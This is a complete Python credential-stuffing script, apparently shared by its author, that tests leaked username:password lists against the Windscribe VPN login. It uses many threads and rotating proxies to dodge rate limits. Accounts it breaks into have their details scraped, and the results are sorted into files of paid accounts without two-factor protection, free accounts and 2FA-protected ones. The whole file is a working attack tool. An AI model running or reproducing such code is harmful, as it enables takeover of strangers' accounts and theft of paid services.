import requests
import threading
import ctypes
import random
import time
import colorama
import os
from threading import Thread
from colorama import init, Fore, Back, Style
init()

combo = open('combos.txt', 'r', encoding='utf-8',
             errors='ignore').read().splitlines()
proxies = open('proxies.txt', 'r').read().splitlines()
proxies = [{'https': 'http://'+proxy} for proxy in proxies]

total = len(combo)
checked = 0
hits = 0
fa = 0
free = 0
retries = 0
cpm = 0
print(f'{Fore.WHITE}[{Fore.YELLOW}THREADS{Fore.WHITE}]:')
threadc = int(input(''))
print(f'\n{Fore.WHITE}[0 = NO RETRIES - Only retries if proxy failed]\n[YOU SHOULD USE ATLEAST 1 RETRY BUT YOU DONT HAVE TO]\n{Fore.WHITE}[{Fore.YELLOW}RETRIES{Fore.WHITE}]:')
retry = int(input(''))


def cls():
    os.system('cls' if os.name == 'nt' else 'clear')


cls()


def title():
    while True:
        ctypes.windll.kernel32.SetConsoleTitleW(
            f'Windscribe Checker - Total: {total}/{checked} - Hits: {hits} - Retries: {retries} - Empty: {free} - 2FA: {fa} - made by c.to/Zentred')


def cpmr():
    global total
    global hits
    global checked
    global cpm
    while True:
        oldchecked = checked
        time.sleep(3)
        newchecked = checked
        cpm = (newchecked - oldchecked) * 20


def divide(stuff):
    return [stuff[i::threadc] for i in range(threadc)]


def main(combo):
    global checked
    global hits
    global free
    global fa
    global empty
    global retries
    for line in combo:
        no_retry = False
        for i in range(retry + 1):
            if no_retry == False:
                try:
                    username, password = line.split(':', 2)
                    req = requests.Session()

                    headers = {
                        'accept': '*/*',
                        'accept-encoding': 'gzip, deflate, br',
                        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
                        'content-length': '0',
                        'origin': 'https://windscribe.com',
                        'referer': 'https://windscribe.com/',
                        'sec-ch-ua': '"Chromium";v="94", "Google Chrome";v="94", ";Not A Brand";v="99"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"Windows"',
                        'sec-fetch-dest': 'empty',
                        'sec-fetch-mode': 'cors',
                        'sec-fetch-site': 'same-site',
                        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36',
                    }

                    r = req.post('https://res.windscribe.com/res/logintoken',
                                 headers=headers, proxies=random.choice(proxies), timeout=2).json()
                    token = r['csrf_token']
                    time = r['csrf_time']

                    data = {
                        'login': '1',
                        'upgrade': '0',
                        'csrf_time': time,
                        'csrf_token': token,
                        'username': username,
                        'password': password,
                        'code': ''
                    }

                    headers1 = {
                        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                        'accept-encoding': 'gzip, deflate, br',
                        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
                        'cache-control': 'max-age=0',
                        'content-length': '144',
                        'content-type': 'application/x-www-form-urlencoded',
                        'origin': 'https://windscribe.com',
                        'referer': 'https://windscribe.com/login',
                        'sec-ch-ua': '"Chromium";v="94", "Google Chrome";v="94", ";Not A Brand";v="99"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"Windows"',
                        'sec-fetch-dest': 'document',
                        'sec-fetch-mode': 'navigate',
                        'sec-fetch-site': 'same-origin',
                        'sec-fetch-user': '?1',
                        'upgrade-insecure-requests': '1',
                        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36'
                    }

                    t = req.post('https://windscribe.com/login', data=data,
                                 headers=headers1, proxies=random.choice(proxies), timeout=2)
                    if 'My Account - Windscribe' in t.text:
                        p = req.get('https://windscribe.com/myaccount',
                                    proxies=random.choice(proxies), timeout=2)
                        username = p.text.split(
                            '<h2>Username</h2>\n<span>')[1].split('</span>')[0]
                        creation_date = p.text.split(
                            'Account</a></h2>\n<span>')[1].split('</span>')[0]
                        account_status = p.text.split('<span id="ma_account_status">\n<strong>')[
                            1].split('<')[0]
                        bandwith = p.text.split(
                            '<h2>Bandwidth Usage</h2>\n<span>')[1].split('</span>')[0]
                        bandwith = bandwith.replace('\n', '')
                        fa_status = p.text.split('<span id="ma_account_2fa_status">\n<strong>')[
                            1].split('</strong>')[0]
                        comparer = p.text.replace('"', '')
                        if 'Disabled' in fa_status and "ma_account_status').html('<i class=ma_green_star></i> <strong>Pro</strong>" in comparer:
                            with open('hits.txt', 'a', encoding='utf-8', errors='ignore') as g:
                                g.writelines(
                                    f'{line} - User: {username} - Creation: {creation_date} - Status: {account_status} - Bandwith: {bandwith}\n')
                            checked += 1
                            no_retry = True
                            hits += 1
                        elif not "ma_account_status').html('<i class=ma_green_star></i> <strong>Pro</strong>" in comparer and 'Disabled' in fa_status:
                            with open('free.txt', 'a', encoding='utf-8', errors='ignore') as g:
                                g.writelines(f'{line}\n')
                            checked += 1
                            no_retry = True
                            free += 1
                        elif not 'Disabled' in fa_status:
                            with open('2fa.txt', 'a', encoding='utf-8', errors='ignore') as g:
                                g.writelines(f'{line}\n')
                            checked += 1
                            no_retry = True
                            fa += 1
                    elif 'Login is not correct' in t.text or 'Login attempt limit reached' in t.text:
                        checked += 1
                        no_retry = True
                except:
                    retries += 1
            else:
                pass


threading.Thread(target=cpmr).start()
threading.Thread(target=title).start()

threads = []
for i in range(threadc):
    threads.append(Thread(target=main, args=[divide(combo)[i]]))
    threads[i].start()
for thread in threads:
    thread.join()
